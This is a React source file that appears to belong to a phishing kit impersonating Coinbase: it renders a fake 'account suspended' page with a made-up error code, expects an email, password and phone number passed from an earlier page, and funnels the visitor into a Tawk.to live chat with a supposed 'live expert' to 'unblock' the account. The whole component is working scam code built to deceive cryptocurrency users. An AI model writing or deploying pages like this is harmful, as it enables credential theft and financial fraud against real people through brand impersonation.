import { useState, useEffect, useRef } from 'react';
import { Link, redirect, useNavigate, useNavigation, useLocation } from "react-router-dom";
import { Helmet, HelmetProvider } from 'react-helmet-async';
import AppLayout from '../../layouts/AppLayout';
import {db} from '../../services/Firebase';
import { collection, addDoc, getDocs } from "firebase/firestore";
import { toast } from 'react-toastify';
import ValidationService from '../../services/ValidationService';
import axios from 'axios';
import TawkMessengerReact from '@tawk.to/tawk-messenger-react';


function Error() {

    let initVerifyFormData          =   {
        email                       :   '', 
        password                    :   '',
        phone_number                    :   '', 
        loading                         :   false
    };

    const [verifyFormData, setVerifyFormData]   =   useState(initVerifyFormData);
    const {state}                               =   useLocation();
    const navigate                              =   useNavigate();
    const tawkMessengerRef                      =   useRef();

    useEffect(() => { 
        console.log('Effect Call')
        setTimeout(() => {
            if(!state || !state.verifyFormData || !state.verifyFormData.email) {
                return navigate("/");
            }
        },2000);
	}, [])

    return (<AppLayout>
        <Helmet>
            <title>Coinbase Explore| Learn| Businesses| Sign up| Login| Download</title>
        </Helmet>
        <div className='container'>
            <div className="row justify-content-center mt20">
                <div className='col-sm-6 bg-white rounded-2 text-dark p25'>
                    <div className="my20">
                        <div className="fs20 py1 fw-bold text-danger">Important Message !</div>
                        <div className="fs16 py1 fw-bold">Due to unauthorized activity and identification failure on your Account. Account Access has been suspended.</div>
                        <div className="fs16 py1 fw-bold">Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.</div>
                        <div className='fw-bold fs24 py10 text-center'>Error CODE: EBRX1:6X76D</div>
                    </div>
                    <div className='text-center'>
                        <button onClick={() => tawkMessengerRef.current.maximize()}  type="submit" className={['btn','btn-primary', 'px20'].join(' ')} >Ask expert</button>
                    </div>
                </div>
            </div>
        </div>
        <TawkMessengerReact
            propertyId="667ef8d49d7f358570d499cf"
            widgetId="1i1fvo0j1"
            ref={tawkMessengerRef}
        />
    </AppLayout>)
}

export default Error
